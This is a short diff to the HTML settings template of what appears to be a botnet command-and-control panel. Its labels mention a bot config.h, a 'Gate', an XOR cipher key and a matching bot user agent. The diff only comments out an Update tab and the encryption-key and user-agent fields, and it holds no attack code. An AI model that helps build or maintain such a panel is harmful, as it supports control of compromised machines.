@@ -53,9 +53,9 @@
                 <li class="nav-item">
                     <a class="nav-link" href="#template" role="tab" data-toggle="tab">Template</a>
                 </li>
-                <li class="nav-item">
+        <!--       <li class="nav-item">
                     <a class="nav-link" href="#update" role="tab" data-toggle="tab">Update</a>
-                </li>
+                </li> -->
             </ul>
               
               <!-- Tab panes -->
@@ -105,7 +105,7 @@
                             <input type="text" class="form-control" name="updateinfo" value="{$config.check_update_url}" id="updateinfo" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
                             <small id="updateinfoHelper" class="form-text text-muted">Check New versions from Darkspider.</small>
                         </div>
-                        <div class="form-group">
+                     <!--  <div class="form-group">
                             <label for="enryptionkey">Enryption Key</label>
                             <input type="text" class="form-control" name="enryptionkey" value="{$config.enryptionkey}" id="enryptionkey" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
                             <small id="enryptionkeyHelper" class="form-text text-muted">We'll never share your encryption key with anyone else. (This is the XOR Cipher Private Key)</small>
@@ -114,7 +114,7 @@
                             <label for="useragent">User Agent</label>
                             <input type="text" class="form-control" name="useragent" value="{$config.useragent}" id="useragent" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
                             <small id="useragentHelper" class="form-text text-muted">The Bot and the Gate need the same HTTP User Agent.</small>
-                        </div>
+                        </div> -->
                         <input type="submit" class="btn btn-dark" value="Save">
                     </form>
                 </div>
